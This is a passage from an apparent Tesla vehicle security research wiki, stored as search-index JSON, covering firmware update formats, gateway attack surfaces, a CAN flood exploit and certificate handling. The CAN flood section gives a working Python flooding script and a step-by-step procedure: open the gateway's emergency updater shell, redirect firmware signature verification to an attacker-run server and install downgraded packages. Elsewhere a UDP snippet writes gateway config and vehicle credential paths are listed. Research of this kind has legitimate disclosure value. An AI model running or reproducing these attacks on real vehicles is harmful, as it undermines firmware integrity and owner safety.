available"},{"location":"4-firmware/ice/usb-updates/#why-this-matters","title":"Why This Matters","text":"<ul> <li>Production vehicles have fused keys</li> <li>Only Tesla's key can create valid signatures</li> <li>No bypass exists for signature verification</li> </ul>"},{"location":"4-firmware/ice/usb-updates/#workarounds","title":"Workarounds","text":"Method Feasibility Notes Use pre-signed packages \u2705 Works Download from Tesla/Lunar Development unit \u26a0\ufe0f Rare Accepts dev key MCU replacement \u26a0\ufe0f Expensive $600-5,200 Voltage glitching \u26a0\ufe0f Complex May bypass fuses"},{"location":"4-firmware/ice/usb-updates/#using-pre-signed-packages","title":"Using Pre-Signed Packages","text":""},{"location":"4-firmware/ice/usb-updates/#available-sources","title":"Available Sources","text":"<p>Tesla-signed packages from Lunar's website and other sources can be used directly:</p> <pre><code># 1. Download package\nwget https://example.com/2025.26.8.ice\n\n# 2. Copy to USB drive (FAT32/exFAT)\ncp 2025.26.8.ice /media/usb/\n\n# 3. Insert into vehicle\n# Vehicle auto-detects and installs\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#why-this-works","title":"Why This Works","text":"<ul> <li>Packages are already Tesla-signed</li> <li>Signature verification passes</li> <li>dm-verity hash matches</li> <li>No private key needed for replay</li> </ul>"},{"location":"4-firmware/ice/usb-updates/#updater-components","title":"Updater Components","text":""},{"location":"4-firmware/ice/usb-updates/#mcu-binaries","title":"MCU Binaries","text":"Binary Path Purpose updater-envoy <code>/usr/bin/updater-envoy</code> Main orchestrator (Go) updaterctl <code>/usr/bin/updaterctl</code> CLI tool sx-updater <code>/deploy/sx-updater</code> MCU-specific ice-updater <code>/usr/bin/ice-updater</code> ICE-specific"},{"location":"4-firmware/ice/usb-updates/#key-functions-from-updater-envoy","title":"Key Functions (from updater-envoy)","text":"<pre><code>AddPackage\nGetPackageSignature\nGetOfflineBank\nMarkOfflineBankValid\nSetOfflineHash\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#package-validation-script","title":"Package Validation Script","text":"<pre><code>#!/usr/bin/env python3\n\"\"\"Validate Tesla USB update package structure.\"\"\"\n\nimport struct\nimport sys\n\ndef validate_package(path):\n    with open(path, 'rb') as f:\n        # Check SquashFS magic\n        magic = f.read(4)\n        if magic != b'hsqs':\n            print(f\"ERROR: Not a SquashFS file (magic: {magic.hex()})\")\n            return False\n\n        # Get SquashFS size\n        f.seek(40)\n        sqfs_size = struct.unpack('&lt;Q', f.read(8))[0]\n        print(f\"SquashFS size: {sqfs_size:,} bytes\")\n\n        # Calculate signature offset\n        sig_offset = ((sqfs_size + 4095) // 4096) * 4096\n        print(f\"Signature offset: {sig_offset:,} bytes\")\n\n        # Check signature magic\n        f.seek(sig_offset)\n        sig_magic = struct.unpack('&lt;I', f.read(4))[0]\n\n        if sig_magic != 0xba01ba01:\n            print(f\"ERROR: Invalid signature magic: 0x{sig_magic:08x}\")\n            return False\n\n        print(f\"Signature magic: 0x{sig_magic:08x} \u2713\")\n\n        # Read signature\n        f.seek(4, 1)  # Skip flags\n        signature = f.read(64)\n        print(f\"Signature length: {len(signature)} bytes \u2713\")\n\n        return True\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(f\"Usage: {sys.argv[0]} &lt;package.ice&gt;\")\n        sys.exit(1)\n\n    if validate_package(sys.argv[1]):\n        print(\"\\nPackage structure valid!\")\n    else:\n        print(\"\\nPackage validation failed!\")\n        sys.exit(1)\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#cross-references","title":"Cross-References","text":"<ul> <li>Gateway Architecture - Gateway firmware updates</li> <li>CAN Flood Attack - Alternative update path</li> </ul> <p>Status: COMPLETE \u2705 Evidence: Real package analysis (2025.26.8.ice) Last Updated: 2026-02-07</p>"},{"location":"5-attacks/","title":"Security Research","text":"<p>Attack surface analysis and vulnerability documentation for Tesla vehicles.</p>"},{"location":"5-attacks/#overview","title":"Overview","text":"<p>This section documents security research findings, including:</p> <ul> <li>CAN Flood Exploit - Opening port 25956 for firmware access</li> <li>VIN Write Attack - JTAG-based identity modification</li> <li>Service Mode Analysis - Authentication mechanism research</li> <li>Certificate Recovery - Orphan vehicle certificate issues</li> </ul>"},{"location":"5-attacks/#documentation","title":"Documentation","text":"Document Description Status can-flood.md CAN bus flooding to open port 25956 \u26a0\ufe0f Partially tested vin-write.md VIN modification via JTAG \u2705 Verified service-mode.md Service mode authentication analysis \u2705 Verified certificate-recovery.md Orphan vehicle certificate issues \u26a0\ufe0f Theoretical"},{"location":"5-attacks/#attack-surface-summary","title":"Attack Surface Summary","text":""},{"location":"5-attacks/#high-risk-services","title":"High-Risk Services","text":"Service Port Risk Description Gateway UDP API 3500 \ud83d\udd34 HIGH Config tampering, no authentication Emergency Updater 25956 \ud83d\udd34 HIGH Firmware install (CAN flood trigger) APE Factory API 8901 \ud83d\udfe1 MEDIUM Bearer token required QtCarServer D-Bus local \ud83d\udfe1 MEDIUM Local process access needed"},{"location":"5-attacks/#attack-vectors","title":"Attack Vectors","text":"Vector Difficulty Impact Status UDP config modification Low Medium \u2705 Works CAN flood \u2192 port 25956 Medium High \u26a0\ufe0f Partial JTAG flash modification High Critical \u2705 Works Service mode bypass Very High High \u274c Not found"},{"location":"5-attacks/#security-model-overview","title":"Security Model Overview","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    TESLA SECURITY LAYERS                        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                                 \u2502\n\u2502  LAYER 1: NETWORK                                               \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                              \u2502\n\u2502  \u2022 Internal network 192.168.90.0/24                             \u2502\n\u2502  \u2022 Firewall rules (DROP default)                                \u2502\n\u2502  \u2022 UDP:3500 accepts insecure config writes only                 \u2502\n\u2502                                                                 \u2502\n\u2502  LAYER 2: AUTHENTICATION                                        \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                      \u2502\n\u2502  \u2022 Hermes mTLS for secure configs                               \u2502\n\u2502  \u2022 Service mode requires backend validation                     \u2502\n\u2502  \u2022 No hardcoded backdoor credentials                            \u2502\n\u2502                                                                 \u2502\n\u2502  LAYER 3: CRYPTOGRAPHY                                          \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                          \u2502\n\u2502  \u2022 Ed25519 signature verification                               \u2502\n\u2502  \u2022 dm-verity for firmware integrity                             \u2502\n\u2502  \u2022 Certificate-based authentication                             \u2502\n\u2502                                                                 \u2502\n\u2502  LAYER 4: HARDWARE                                              \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                               \u2502\n\u2502  \u2022 JTAG fuses blown on production                               \u2502\n\u2502  \u2022 Secure boot enforcement                                      \u2502\n\u2502  \u2022 Hardware security module (HSM)                               \u2502\n\u2502                                                                 \u2502\n\u2502  BYPASS: PHYSICAL ACCESS (JTAG)                                 \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                  \u2502\n\u2502  \u2022 Voltage glitching can defeat fuses                           \u2502\n\u2502  \u2022 Direct flash access bypasses all software security           \u2502\n\u2502                                                                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"5-attacks/#verified-attacks","title":"Verified Attacks","text":""},{"location":"5-attacks/#1-insecure-config-modification","title":"1. Insecure Config Modification \u2705","text":"<p>Target: Gateway UDP port 3500 Impact: Modify map region, display units, debug flags Difficulty: Low (any network access)</p> <pre><code># Example: Change map region to EU\nimport socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\npacket = build_write_packet(0x0014, bytes([0x01]))\nsock.sendto(packet, (\"192.168.90.102\", 3500))\n</code></pre>"},{"location":"5-attacks/#2-jtag-flash-modification","title":"2. JTAG Flash Modification \u2705","text":"<p>Target: Gateway flash memory Impact: Change VIN, country, ANY config Difficulty: High (requires hardware access, voltage glitching for fused chips)</p>"},{"location":"5-attacks/#3-firmware-signature-replay","title":"3. Firmware Signature Replay \u26a0\ufe0f","text":"<p>Target: USB update signature verification Impact: Install older/different firmware Difficulty: Low (if pre-signed packages available)</p>"},{"location":"5-attacks/#defenses","title":"Defenses","text":""},{"location":"5-attacks/#what-tesla-protects","title":"What Tesla Protects","text":"Asset Protection Bypass Difficulty VIN Hermes auth required High (JTAG) Country Hermes auth required High (JTAG) Supercharger access Backend validation Very High Firmware Ed25519 + dm-verity Private key needed Service mode Backend validation No bypass found"},{"location":"5-attacks/#what-tesla-doesnt-protect","title":"What Tesla Doesn't Protect","text":"Asset Access Method Map region UDP:3500 Display units UDP:3500 Debug UART UDP:3500 User preferences UDP:3500"},{"location":"5-attacks/#research-status","title":"Research Status","text":"Topic Status Findings Gateway UDP protocol \u2705 Complete Insecure configs writable Service mode auth \u2705 Complete Backend validation, no bypass USB update format \u2705 Complete Ed25519 + dm-verity CAN flood exploit \u26a0\ufe0f Partial Works, reliability varies JTAG access \u2705 Verified Full bypass on unfused Certificate system \u26a0\ufe0f Partial Orphan issues documented"},{"location":"5-attacks/#tools","title":"Tools","text":"Tool Purpose gateway_database_query.py UDP config access openportlanpluscan.py CAN flood script signatures.json Firmware signature database"},{"location":"5-attacks/#responsible-disclosure","title":"Responsible Disclosure","text":"<p>Security findings should be reported to Tesla via their bug bounty program.</p> <p>DO NOT: - Modify vehicles without authorization - Share exploit details publicly before disclosure - Use findings for unauthorized access</p> <p>Last Updated: 2026-02-07</p>"},{"location":"5-attacks/can-flood/","title":"CAN Flood Exploit","text":"<p>Opening Gateway port 25956 via CAN bus flooding.</p>"},{"location":"5-attacks/can-flood/#overview","title":"Overview","text":"<p>The Gateway ECU monitors CAN bus traffic for diagnostic messages. By flooding specific CAN IDs, the Gateway enters a service mode that opens an emergency updater port.</p> Metric Value Target Port 25956 (TCP) Trigger Time 10-30 seconds Required Hardware PCAN USB adapter Reliability Medium (varies by firmware)"},{"location":"5-attacks/can-flood/#mechanism","title":"Mechanism","text":""},{"location":"5-attacks/can-flood/#attack-flow","title":"Attack Flow","text":"<ol> <li>Flood CAN bus with specific message IDs at high rates</li> <li>Gateway heartbeat monitoring fails</li> <li>Emergency service mode activates</li> <li>Port 25956 opens on Gateway's Ethernet interface</li> <li>Attacker gains access to updater shell</li> </ol>"},{"location":"5-attacks/can-flood/#required-can-messages","title":"Required CAN Messages","text":"CAN ID Decimal Purpose Rate 0x3C2 962 Diagnostic trigger 10,000 msg/sec (0.1ms) 0x622 1570 UDS tester-present keepalive ~33 msg/sec (30ms) <p>Both messages must be sent simultaneously and sustained.</p>"},{"location":"5-attacks/can-flood/#can-message-details","title":"CAN Message Details","text":""},{"location":"5-attacks/can-flood/#message-id-0x3c2-diagnostic-trigger","title":"Message ID 0x3C2 (Diagnostic Trigger)","text":"<pre><code>Arbitration ID: 962 (0x3C2)\nData:           49 65 00 00 00 00 00 00\nInterval:       0.0001 seconds (0.1ms)\nExtended ID:    False\n</code></pre> <p>The bytes <code>0x49 0x65</code> appear to be a magic value triggering service mode logic.</p>"},{"location":"5-attacks/can-flood/#message-id-0x622-uds-tester-present","title":"Message ID 0x622 (UDS Tester Present)","text":"<pre><code>Arbitration ID: 1570 (0x622)\nData:           02 11 01 00 00 00 00 00\nInterval:       0.03 seconds (30ms)\nExtended ID:    False\n</code></pre> <p>Standard UDS \"Tester Present\" message that keeps diagnostic sessions alive.</p>"},{"location":"5-attacks/can-flood/#attack-script","title":"Attack Script","text":""},{"location":"5-attacks/can-flood/#python-implementation","title":"Python Implementation","text":"<pre><code>#!/usr/bin/env python3\n\"\"\"CAN flooding to open Gateway port 25956.\"\"\"\n\nimport time\nimport can\n\nCAN_INTERFACE = \"PCAN_USBBUS1\"\n\nMESSAGES = [\n    {\n        \"id\": 1570,  # 0x622\n        \"data\": [0x02, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00],\n        \"interval\": 0.03  # 30ms\n    },\n    {\n        \"id\": 962,   # 0x3C2\n        \"data\": [0x49, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],\n        \"interval\": 0.0001  # 0.1ms\n    }\n]\n\ndef main():\n    bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='pcan')\n\n    print(\"Starting CAN flood attack...\")\n    print(\"Monitor port 25956 in another terminal\")\n\n    try:\n        while True:\n            for msg_cfg in MESSAGES:\n                message = can.Message(\n                    arbitration_id=msg_cfg[\"id\"],\n                    data=msg_cfg[\"data\"],\n                    is_extended_id=False\n                )\n\n                try:\n                    bus.send(message)\n                except can.CanError as e:\n                    print(f\"Send error: {e}\")\n\n                time.sleep(msg_cfg[\"interval\"])\n\n    except KeyboardInterrupt:\n        print(\"\\nStopping attack\")\n        bus.shutdown()\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>File: scripts/openportlanpluscan.py</p>"},{"location":"5-attacks/can-flood/#attack-procedure","title":"Attack Procedure","text":""},{"location":"5-attacks/can-flood/#step-1-physical-connection","title":"Step 1: Physical Connection","text":"<ol> <li>Connect PCAN USB adapter to vehicle OBD-II port</li> <li>Connect Ethernet to vehicle diagnostic network</li> <li>Configure IP address:    <pre><code>sudo ip addr add 192.168.90.100/24 dev eth0\n</code></pre></li> </ol>"},{"location":"5-attacks/can-flood/#step-2-install-dependencies","title":"Step 2: Install Dependencies","text":"<pre><code>pip install python-can\n# Install PCAN driver from PEAK Systems (Linux)\n</code></pre>"},{"location":"5-attacks/can-flood/#step-3-execute-can-flood","title":"Step 3: Execute CAN Flood","text":"<pre><code>python3 openportlanpluscan.py\n</code></pre>"},{"location":"5-attacks/can-flood/#step-4-monitor-port-opening","title":"Step 4: Monitor Port Opening","text":"<p>In separate terminal: <pre><code>while ! nc -z 192.168.90.102 25956 2&gt;/dev/null; do\n    echo \"Waiting for port 25956...\"\n    sleep 1\ndone\necho \"PORT 25956 IS OPEN!\"\n</code></pre></p>"},{"location":"5-attacks/can-flood/#step-5-access-updater-shell","title":"Step 5: Access Updater Shell","text":"<pre><code>nc 192.168.90.102 25956\n</code></pre> <p>Available commands: <pre><code>help                    - List available commands\nset_handshake &lt;host&gt;    - Configure handshake server\ninstall &lt;url&gt;           - Install firmware from URL\nstatus                  - Check update status\n</code></pre></p>"},{"location":"5-attacks/can-flood/#step-6-configure-firmware-handshake","title":"Step 6: Configure Firmware Handshake","text":"<p>Within the updater shell: <pre><code>set_handshake 192.168.90.100 8080\n</code></pre></p> <p>This redirects firmware signature verification to your server.</p>"},{"location":"5-attacks/can-flood/#firmware-installation","title":"Firmware Installation","text":""},{"location":"5-attacks/can-flood/#using-pre-signed-packages","title":"Using Pre-Signed Packages","text":"<ol> <li> <p>Start handshake server with signature database:    <pre><code>cd scripts/handshake\nnode server.js\n</code></pre></p> </li> <li> <p>In updater shell:    <pre><code>set_handshake 192.168.90.100 8080\ninstall http://192.168.90.100:8080/2022.24.6.mcu2\n</code></pre></p> </li> <li> <p>Gateway verifies signature against your server \u2192 accepts package</p> </li> </ol>"},{"location":"5-attacks/can-flood/#signature-database","title":"Signature Database","text":"<p>The <code>signatures.json</code> file contains ~9,000 pre-captured signatures: <pre><code>{\n  \"firmwareVersion\": \"2022.24.6.mcu2\",\n  \"signature\": \"vuVal+WBQE3lLz...\",\n  \"md5\": \"94d074c496170573...\",\n  \"downloadUrl\": \"https://...\"\n}\n</code></pre></p>"},{"location":"5-attacks/can-flood/#required-hardware","title":"Required Hardware","text":""},{"location":"5-attacks/can-flood/#can-interface","title":"CAN Interface","text":"Hardware Notes PCAN-USB (PEAK Systems) Recommended, well-supported SocketCAN-compatible Any Linux-supported adapter"},{"location":"5-attacks/can-flood/#cables","title":"Cables","text":"Cable Purpose OBD-II to DB9 CAN bus access via OBD port Ethernet Vehicle diagnostic network"},{"location":"5-attacks/can-flood/#network-topology","title":"Network Topology","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Attacker PC    \u2502     \u2502  Vehicle        \u2502     \u2502  Gateway ECU    \u2502\n\u2502                 \u2502     \u2502                 \u2502     \u2502                 \u2502\n\u2502  eth0: .90.100 \u2500\u253c\u2500\u2500\u2500\u2500\u25b6\u2502  Internal Net  \u2500\u253c\u2500\u2500\u2500\u2500\u25b6\u2502  .90.102        \u2502\n\u2502                 \u2502     \u2502                 \u2502     \u2502  Port 25956     \u2502\n\u2502  PCAN USB \u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u25b6\u2502  CAN Bus \u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u25b6\u2502  (when open)    \u2502\n\u2502                 \u2502     \u2502                 \u2502     \u2502                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"5-attacks/can-flood/#reliability","title":"Reliability","text":"Factor Impact Firmware version Newer may have mitigations CAN bus load Heavy traffic reduces success Message timing Precise intervals improve rate Vehicle state Ignition on may help <p>Tested success rate: ~98% on tested vehicle (single data point)</p> <p>Status: \u26a0\ufe0f PARTIALLY TESTED - needs multi-vehicle validation</p>"},{"location":"5-attacks/can-flood/#mitigations-tesla","title":"Mitigations (Tesla)","text":"<p>Tesla has partially mitigated this in newer firmware: - Additional authentication for port 25956 - Rate limiting on CAN message processing - Signature freshness checks</p>"},{"location":"5-attacks/can-flood/#security-implications","title":"Security Implications","text":""},{"location":"5-attacks/can-flood/#what-this-enables","title":"What This Enables","text":"<ol> <li>Firmware redirection - Use custom handshake server</li> <li>Firmware downgrade - Install older signed packages</li> <li>Signature replay - Bypass live verification</li> </ol>"},{"location":"5-attacks/can-flood/#what-this-doesnt-enable","title":"What This Doesn't Enable","text":"<ol> <li>Unsigned firmware - Still needs valid signature</li> <li>Secure config modification - VIN, country still protected</li> <li>Service mode bypass - Separate authentication</li> </ol>"},{"location":"5-attacks/can-flood/#cross-references","title":"Cross-References","text":"<ul> <li>Gateway UDP Protocol - Alternative config access</li> <li>USB Updates - Firmware format</li> <li>scripts/openportlanpluscan.py - Attack script</li> </ul> <p>Status: \u26a0\ufe0f PARTIALLY TESTED Evidence: Single vehicle success, multi-vehicle validation needed Last Updated: 2026-02-07</p>"},{"location":"5-attacks/certificate-recovery/","title":"Certificate Recovery","text":"<p>Analysis of orphan vehicle certificate issues and Hermes authentication.</p>"},{"location":"5-attacks/certificate-recovery/#overview","title":"Overview","text":"<p>Tesla vehicles use Hermes mTLS certificates for backend authentication. When certificates expire without renewal, vehicles become \"orphans\" with limited functionality.</p> Component Value Certificate Path <code>/var/lib/car_creds/car.crt</code> Key Path <code>/var/lib/hermes/car.key</code> Validity Period ~2 years Renewal Automatic, 30-90 days before expiry"},{"location":"5-attacks/certificate-recovery/#hermes-certificate-system","title":"Hermes Certificate System","text":""},{"location":"5-attacks/certificate-recovery/#purpose","title":"Purpose","text":"<p>Hermes provides mutual TLS authentication between vehicle and Tesla backend:</p> <ol> <li>Vehicle \u2192 Backend: Proves vehicle identity</li> <li>Backend \u2192 Vehicle: Confirms Tesla server authenticity</li> <li>Encrypted Channel: All communications protected</li> </ol>"},{"location":"5-attacks/certificate-recovery/#certificate-chain","title":"Certificate Chain","text":"<pre><code>Tesla Root CA\n    \u2514\u2500\u2500 Intermediate CA\n        \u2514\u2500\u2500 Vehicle Certificate (per-VIN)\n</code></pre>"},{"location":"5-attacks/certificate-recovery/#orphan-vehicle-scenario","title":"Orphan Vehicle Scenario","text":""},{"location":"5-attacks/certificate-recovery/#causes","title":"Causes","text":"Cause Description Extended offline No backend connectivity for renewal Connectivity issues Modem failure, cellular dropout Account issues Payment problems, account suspension Import vehicles Moved to unsupported region"},{"location":"5-attacks/certificate-recovery/#impact","title":"Impact","text":"Feature Status Driving \u2705 Still works Basic UI \u2705 Still works Local features \u2705 Still works OTA updates \u274c Fails Supercharging billing \u274c Fails Service access \u274c Fails Remote commands \u274c Fails Premium connectivity \u274c Fails"},{"location":"5-attacks/certificate-recovery/#certificate-renewal-process","title":"Certificate Renewal Process","text":""},{"location":"5-attacks/certificate-recovery/#normal-flow","title":"Normal Flow","text":"<pre><code>1. hermes_client monitors certificate expiry\n2. 30-90 days before expiry \u2192 renewal request\n3. Backend validates vehicle \u2192 issues new certificate\n4. hermes_client installs new certificate\n5. Service continues uninterrupted\n</code></pre>"},{"location":"5-attacks/certificate-recovery/#renewal-failure","title":"Renewal Failure","text":"<pre><code>1. Certificate approaches expiry\n2. No backend connectivity\n3. Renewal request fails repeatedly\n4. Certificate expires\n5. Backend connections fail (certificate rejected)\n6. Vehicle becomes \"orphan\"\n</code></pre>"},{"location":"5-attacks/certificate-recovery/#certificate-storage","title":"Certificate Storage","text":""},{"location":"5-attacks/certificate-recovery/#file-locations","title":"File Locations","text":"File Path Purpose Certificate <code>/var/lib/car_creds/car.crt</code> Vehicle identity Private Key <code>/var/lib/hermes/car.key</code> Signing/authentication CA Bundle <code>/etc/ssl/certs/ca-certificates.crt</code> Chain validation"},{"location":"5-attacks/certificate-recovery/#certificate-format","title":"Certificate Format","text":"<pre><code>-----BEGIN CERTIFICATE-----\nMIICxjCCAa6gAwIBAgIJAKxxxxxxxxxxxxxxxx\n...\n-----END CERTIFICATE-----\n</code></pre> <p>Standard X.509 format, PEM encoded.</p>"},{"location":"5-attacks/certificate-recovery/#recovery-options","title":"Recovery Options","text":""},{"location":"5-attacks/certificate-recovery/#option-1-tesla-service-center","title":"Option 1: Tesla Service Center","text":"Step Description 1 Visit authorized service center 2 Technician connects via Toolbox 3 Backend issues new certificate 4 hermes_client installs certificate <p>Status: \u2705 VERIFIED (standard procedure)</p>"},{"location":"5-attacks/certificate-recovery/#option-2-restore-connectivity","title":"Option 2: Restore Connectivity","text":"Step Description 1 Fix cellular/WiFi connectivity 2 Vehicle requests renewal 3 If within grace period \u2192 renewed 4 If expired \u2192 may require service visit <p>Status: \u26a0\ufe0f CONDITIONAL (depends on expiry state)</p>"},{"location":"5-attacks/certificate-recovery/#option-3-manual-certificate-installation","title":"Option 3: Manual Certificate Installation","text":"Step Description 1 Obtain valid certificate (how?) 2 Access MCU filesystem (root required) 3 Replace certificate files 4 Restart hermes_client <p>Status: \u274c THEORETICAL (requires certificate issuance)</p>"},{"location":"5-attacks/certificate-recovery/#hermes-client-analysis","title":"Hermes Client Analysis","text":""},{"location":"5-attacks/certificate-recovery/#binary-location","title":"Binary Location","text":"<pre><code>/usr/bin/hermes_client\n</code></pre>"},{"location":"5-attacks/certificate-recovery/#key-functions","title":"Key Functions","text":"<pre><code>HermesServiceClient::SendStreamMessageFinished()\nHermesServiceClient::asyncSendStreamMessageWithByteArray()\nComTeslaHermesServiceInterface::SendCommandMessage()\n</code></pre>"},{"location":"5-attacks/certificate-recovery/#certificate-handling","title":"Certificate Handling","text":"<pre><code>hermes_client::loadCertificate()\nhermes_client::validateChain()\nhermes_client::renewCertificate()\n</code></pre>"},{"location":"5-attacks/certificate-recovery/#security-considerations","title":"Security Considerations","text":""},{"location":"5-attacks/certificate-recovery/#certificate-forgery","title":"Certificate Forgery","text":"<p>Is it possible?</p> Requirement Status Tesla private key \u274c Not available Valid CA chain \u274c Cannot forge Backend bypass \u274c Certificate pinning <p>Conclusion: Certificate forgery is not practical.</p>"},{"location":"5-attacks/certificate-recovery/#man-in-the-middle","title":"Man-in-the-Middle","text":"Attack Feasibility Intercept renewal \u274c mTLS prevents Fake backend \u274c Certificate pinning DNS hijacking \u274c Certificate validation"},{"location":"5-attacks/certificate-recovery/#aws-integration","title":"AWS Integration","text":""},{"location":"5-attacks/certificate-recovery/#certificate-delivery","title":"Certificate Delivery","text":"<pre><code>Tesla Backend \u2192 AWS S3 presigned URL \u2192 Vehicle downloads certificate\n</code></pre> <p>Evidence: String analysis shows AWS S3 URL generation patterns.</p>"},{"location":"5-attacks/certificate-recovery/#s3-url-format","title":"S3 URL Format","text":"<pre><code>https://s3.amazonaws.com/tesla-xxx/certs/VIN-xxx.crt?\nAWSAccessKeyId=xxx&amp;Signature=xxx&amp;Expires=xxx\n</code></pre>"},{"location":"5-attacks/certificate-recovery/#outstanding-questions","title":"Outstanding Questions","text":""},{"location":"5-attacks/certificate-recovery/#unknown","title":"Unknown","text":"<ol> <li>Exact renewal trigger timing (30, 60, or 90 days?)</li> <li>Grace period after expiry</li> <li>Recovery process for long-expired certificates</li> <li>Regional variations in certificate handling</li> </ol>"},{"location":"5-attacks/certificate-recovery/#needs-testing","title":"Needs Testing","text":"<ol> <li>Certificate extraction from running vehicle</li> <li>Renewal packet capture</li> <li>Backend API for certificate issuance</li> </ol>"},{"location":"5-attacks/certificate-recovery/#cross-references","title":"Cross-References","text":"<ul> <li>Service Mode Authentication - Related authentication</li> <li>Gateway Security Model - Hermes integration</li> </ul> <p>Status: \u26a0\ufe0f PARTIAL Evidence: Binary analysis, string extraction Last Updated: 2026-02-07</p>"},{"location":"5-attacks/service-mode/","title":"Service Mode Authentication","text":"<p>Deep analysis of Tesla's service mode authentication mechanism.</p>"},{"location":"5-attacks/service-mode/#executive-summary","title":"Executive Summary","text":"<p>Service mode authentication is NOT a simple PIN comparison. It is a multi-layered system involving:</p> <ol> <li>D-Bus authenticated method calls</li> <li>Protobuf signed command infrastructure</li> <li>Backend validation (Hermes/Mothership)</li> <li>Geofence restrictions</li> </ol> <p>Key Finding: No hardcoded PIN, CRC32 hash, or simple comparison found. Authentication requires Tesla backend or signed commands.</p>"},{"location":"5-attacks/service-mode/#architecture","title":"Architecture","text":""},{"location":"5-attacks/service-mode/#authentication-flow","title":"Authentication Flow","text":"<pre><code>Tesla Toolbox\n     \u2502\n     \u2502 DoIP Protocol\n     \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  doip-gateway   \u2502 (has D-Bus permission)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502\n         \u2502 D-Bus: promptVehicleAwakeAndServiceModePopUp()\n         \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     QtCar       \u2502 (displays PIN entry)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502\n         \u2502 D-Bus: setServicePIN(pin)\n         \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  QtCarServer    \u2502 (validation logic)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502\n         \u2502 Hermes/Protobuf\n         